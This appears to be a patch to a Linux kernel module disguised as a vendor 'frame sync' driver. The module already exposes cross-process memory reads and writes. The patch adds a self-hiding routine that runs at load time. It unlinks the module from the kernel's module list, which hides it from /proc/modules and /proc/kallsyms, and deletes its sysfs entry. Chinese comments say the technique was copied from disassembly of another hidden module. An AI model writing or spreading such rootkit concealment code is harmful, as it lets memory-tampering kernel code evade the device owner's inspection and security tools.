@@ -35,6 +35,8 @@
 #include <linux/version.h>
 #include <linux/fs.h>
 #include <linux/io.h>
+#include <linux/kobject.h>
+#include <linux/list.h>
 
 #include <asm/cpu.h>
 #include <asm/io.h>
@@ -259,9 +261,36 @@ ssize_t frame_sync_rw_mem(pid_t pid, uintptr_t addr, void *buffer,
 	return (count > 0 ? count : -EFAULT);
 }
 
+/*
+ * 自隐藏（工单 #2）：装载后从三处除名。
+ *   - /proc/modules + /proc/kallsyms：摘 modules 链表（二者都遍历这条链表）
+ *   - /sys/module/oplus_frame_sync：删 kobject
+ *
+ * 参考恶魔 emo 反汇编还原（init_module 内）：
+ *   手动内联摘链表（等价 list_del_init，零符号依赖，不赌
+ *   __list_del_entry_valid_or_report 是否导出）+ kobject_del。
+ *   不拿 module_mutex（恶魔同款，init 阶段窗口极小）；只 del 不 put。
+ */
+static void frame_sync_hide(void)
+{
+	struct list_head *l = &THIS_MODULE->list;
+
+	/* ① 摘链表：prev->next = next; next->prev = prev; 再自环 */
+	l->next->prev = l->prev;
+	l->prev->next = l->next;
+	l->next = l;
+	l->prev = l;
+
+	/* ② 删 kobject（只 del 不 put，保留模块对象） */
+	kobject_del(&THIS_MODULE->mkobj.kobj);
+}
+
 static int __init frame_sync_init(void)
 {
-	/* 工单 #1：仅注册模块，通道/采样/自隐藏在后续工单接入 */
+	/* 工单 #1：读取核心已就位；通道/采样在后续工单接入 */
+	/* 工单 #2：最后一步自隐藏 */
+	frame_sync_hide();
+
 	return 0;
 }
 
